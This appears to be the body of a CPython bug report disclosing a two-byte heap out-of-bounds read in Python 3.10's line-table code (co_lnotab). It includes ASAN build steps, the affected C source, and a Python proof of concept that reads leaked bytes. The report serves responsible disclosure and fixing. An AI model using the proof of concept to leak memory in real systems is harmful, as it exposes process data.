    "body": "**Problem:** Out of bound read of two bytes if `co_lnotab = b'\\0'`\r\n\r\n**Report:** \"\"\"\r\nI've found two heap read out of bound in python 3.10 and 3.12 (and\r\nprobably 3.11) in the built-in library.\r\nThese are not critical bugs as they are caught by debug assertions and\r\nallow to leak relatively little data (from 16 to 42 bits).\r\n...\r\nHere are the two proofs of concepts, I just wrote a little writeup and reproduction steps at the top of them.\r\nI also added the fully symbolized ASAN crash reports.\r\n\r\nTLDR: `co_positions` and `co_lnotab` are not properly bounds-checked, which is a problem only on adversarially constructed code objects\r\n  which shouldn't be critical as it requires code execution, but it might be triggered by code by libraries that manipulate the code objects.\r\n(I found this bug in a library, and I'm also contacting them to patch it)\r\n\r\nThank you,\r\nTommaso Fontana\r\n\"\"\" - @zommiommy _(editor: I assume this is you? apologies if not!)_\r\n\r\n_(editor: I'm splitting this out into two issues, one for 3.12 co_positions and another for 3.10 c_lnotab)_\r\n\r\n# ASAN reproduction steps\r\n```bash\r\n# manually configure python with asan\r\nOPT=\"-O0\" CC=\"/usr/bin/clang\" CFLAGS=\"-g\" CXX=\"/usr/bin/clang++\" CXXFLAGS=\"-g\" ./configure --with-address-sanitizer --with-ensurepip=install --with-lto=no\r\n# compile it\r\nmake -j24\r\n# run the code\r\nASAN_SYMBOLIZER_PATH=$(which llvm-symbolizer) ./Python-3.10.8_asan/python ./poc_heap_leak_3.10.py\r\n```\r\n\r\n# Relevant code\r\nfrom `Objects/codeobject.c`\r\n```C\r\nstatic void\r\nadvance(PyCodeAddressRange *bounds)\r\n{\r\n    bounds->ar_start = bounds->ar_end;\r\n    int delta = ((unsigned char *)bounds->opaque.lo_next)[0];\r\n    bounds->ar_end += delta;\r\n    int ldelta = ((signed char *)bounds->opaque.lo_next)[1];\r\n    bounds->opaque.lo_next += 2;\r\n    if (ldelta == -128) {\r\n        bounds->ar_line = -1;\r\n    }\r\n    else {\r\n        bounds->opaque.computed_line += ldelta;\r\n        bounds->ar_line = bounds->opaque.computed_line;\r\n    }\r\n}\r\n\r\nint\r\nPyLineTable_NextAddressRange(PyCodeAddressRange *range)\r\n{\r\n    if (at_end(range)) {\r\n        return 0;\r\n    }\r\n    advance(range);\r\n    while (range->ar_start == range->ar_end) {\r\n        assert(!at_end(range)); // <========= this assert catches this bug\r\n        advance(range);\r\n    }\r\n    return 1;\r\n}\r\n```\r\n\r\nsince bytes are saved with a trailing `\\0` (this can be seen in `Objects/bytesobject.c` at `_PyBytes_fromSize`),\r\nsetting `co_lnotab = b'\\0'` would result in a memory layout of `00 00 UB UB` where `UB` are some out of bound bytes.\r\n\r\nCalling advance the first time would consume the first two known bytes, but because\r\n```C\r\nint delta = ((unsigned char *)bounds->opaque.lo_next)[0];\r\nbounds->ar_end += delta;\r\n```\r\nthe condition of the while is still satified, so we are able to execute an extra advance\r\nwhich leaks the two consecutive bytes.\r\n\r\n```\r\nimport types\r\nimport struct\r\n\r\n# any value it's fine, but if line[2] - n is < 0 it would become a None\r\n# so in order to leak as much data as possible, this value is ideal\r\nn = 2**30 - 1\r\n# The leak depends on where this buffer is allocated, so playing with its length\r\n# or allocation point might help leak different things\r\nlnotab = b\"\\x00\"\r\n\r\nc = types.CodeType(\r\n    0, #code_obj.co_argcount, \r\n    0, #code_obj.co_posonlyargcount,\r\n    0, #code_obj.co_kwonlyargcount, \r\n    0, #code_obj.co_nlocals,\r\n    0, #code_obj.co_stacksize, \r\n    0, #code_obj.co_flags,\r\n    b'', #code_obj.co_code, \r\n    tuple(), #code_obj.co_consts, \r\n    tuple(), #code_obj.co_names,\r\n    tuple(), #code_obj.co_varnames, \r\n    '', #code_obj.co_filename,\r\n    '', #code_obj.co_name, \r\n    n, #code_obj.co_firstlineno, \r\n    lnotab,#code_obj.co_lnotab,\r\n    tuple(), #code_obj.co_freevars, \r\n    tuple(), #code_obj.co_cellvars,\r\n)\r\n\r\nline = next(c.co_lines())\r\nleak1 = struct.pack(\"B\", line[1] - line[0])\r\nleak2 = struct.pack(\"b\", line[2] - n)\r\nprint(leak1 + leak2, end=\" \")\r\n```",
